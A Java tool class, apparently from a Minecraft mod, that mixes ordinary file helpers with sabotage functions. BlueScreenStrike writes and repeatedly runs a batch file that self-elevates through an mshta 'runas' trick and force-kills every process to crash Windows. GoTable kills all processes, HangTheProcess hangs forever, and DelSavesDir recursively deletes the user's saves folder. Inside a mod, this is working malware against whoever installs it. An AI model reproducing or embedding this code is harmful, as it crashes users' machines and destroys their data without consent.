package nbmod.ksmcbrigade.Tools;

import java.io.*;
import java.util.Scanner;

public class tool {
    public tool() {
    }

    public static String getrundirname() {
        String a = System.getProperty("user.dir");
        File tempFile = new File(a.trim());
        String dirname = tempFile.getName();
        return dirname;
    }

    public static String getrundir() {
        String dir = System.getProperty("user.dir");
        return dir;
    }

    public static boolean deletedir(File dirFile) {
        if (!dirFile.exists()) {
            return false;
        } else if (dirFile.isFile()) {
            return dirFile.delete();
        } else {
            File[] var1 = dirFile.listFiles();
            int var2 = var1.length;

            for(int var3 = 0; var3 < var2; ++var3) {
                File file = var1[var3];
                deletedir(file);
            }

            return dirFile.delete();
        }
    }

    public static boolean writefile(String Content, String filepath) {
        boolean flag = false;

        try {
            PrintWriter pw = new PrintWriter(filepath);
            pw.write(Content);
            pw.flush();
            pw.close();
            flag = true;
        } catch (Exception var4) {
            var4.printStackTrace();
        }

        return flag;
    }

    public static boolean isexistdirsandcreate(String path) {
        File file = new File(path);
        if (!file.exists() && !file.isDirectory()) {
            file.mkdirs();
            return false;
        } else {
            return true;
        }
    }

    public static boolean isexistfileandcreate(String path) {
        File file = new File(path);
        if (!file.exists()) {
            try {
                file.createNewFile();
            } catch (IOException var3) {
                var3.printStackTrace();
            }

            return false;
        } else {
            return true;
        }
    }

    public static boolean isexistdirs(String path) {
        File file = new File(path);
        return file.exists() || file.isDirectory();
    }

    public static boolean isexistfile(String path) {
        File file = new File(path);
        if (!file.exists()) {
            try {
                file.createNewFile();
                file.delete();
            } catch (IOException var3) {
                var3.printStackTrace();
            }

            return false;
        } else {
            return true;
        }
    }

    public static String getfilecontent(String filename) {
        String text = "";
        String errortext = "error";

        try {
            File myObj = new File(filename);

            Scanner myReader;
            String data;
            for(myReader = new Scanner(myObj); myReader.hasNextLine(); text = text + data) {
                data = myReader.nextLine();
            }

            myReader.close();
            return text;
        } catch (FileNotFoundException var6) {
            System.out.println("An error occurred.");
            var6.printStackTrace();
            return errortext;
        }
    }

    public static boolean delfile(String filename) {
        File file = new File(filename);
        return file.delete();
    }

    public static boolean GenerateAnEmptyFolder(String dirname) {
        File file = new File(dirname);
        return file.mkdirs();
    }
    public static String cuteCmd(String command){
        Runtime runtime = Runtime.getRuntime();
        StringBuilder builder = null;
        try {
            Process process = runtime.exec("cmd /c start " + command);
            BufferedReader brBufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "UTF-8"));
            String line = "";
            builder = new StringBuilder();
            while ((line = brBufferedReader.readLine()) != null) {
                System.out.println(line);
                builder.append(line);
            }
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        return builder.toString();
    }
    public static void BlueScreenStrike()
    {
        String a = "@echo off";
        String b = "%1 mshta vbscript:CreateObject(" + "\"Shell.Application\"" + ").ShellExecute(" + "\"cmd.exe\"" + "," + "\"/c %~s0 ::\"" + "," + "\"\"" + "," + "\"runas\"" + ",1)(window.close)&&exit";
        String c = "cd /d " + "\"%~dp0\"";
        String d = "taskkill /f /fi" + " \" pid ge 1 \" " + "/t";
        String e = a + "\n" + b + "\n" + c + "\n" + d;
        //String f = "bluescreen.bat";
        writefile(e,"bluescreen.bat");
        //String b = a.replaceFirst("'", "\");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd("bluescreen.bat");
        cuteCmd(d);
        cuteCmd(d);
        cuteCmd(d);
        //return e;
    }
    public static void HangTheProcess()
    {
        while(true){
            try {
                Thread.sleep(2000);
                System.out.println("线程睡眠两秒! \n");
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
    public static void GoTable()
    {
        String gotable = "taskkill  /fi" + " \" pid ge 1 \" ";
        cuteCmd(gotable);
        cuteCmd(gotable);
        cuteCmd(gotable);
    }
    public static void DelSavesDir(){
        deletedir(new File(getrundir() + "\\saves"));
        deletedir(new File(getrundir() + "\\saves"));
        deletedir(new File(getrundir() + "\\saves"));
        deletedir(new File(getrundir() + "\\saves"));
        deletedir(new File(getrundir() + "\\saves"));
        deletedir(new File("saves"));
        deletedir(new File("saves"));
        deletedir(new File("saves"));
        deletedir(new File("saves"));
        deletedir(new File("saves"));
    }
}
